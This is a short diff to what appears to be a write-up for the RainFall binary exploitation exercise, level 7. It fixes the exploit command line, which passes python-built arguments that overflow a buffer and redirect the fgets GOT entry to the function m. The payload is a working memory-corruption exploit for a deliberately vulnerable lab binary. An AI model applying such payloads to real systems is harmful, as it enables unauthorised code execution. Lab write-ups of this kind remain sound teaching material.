@@ -26,5 +26,5 @@ Since we need the fgets to work properly, that only leaves fgets which address i
 and we need to pass the m address at 0x080484f4
 
 ```
-level7@RainFall:~$ ltrace ./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08")') + $(python -c 'print("\xf4\x84\x04\x08")')
+level7@RainFall:~$ ./level7 $(python -c 'print("A"*20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
 ```
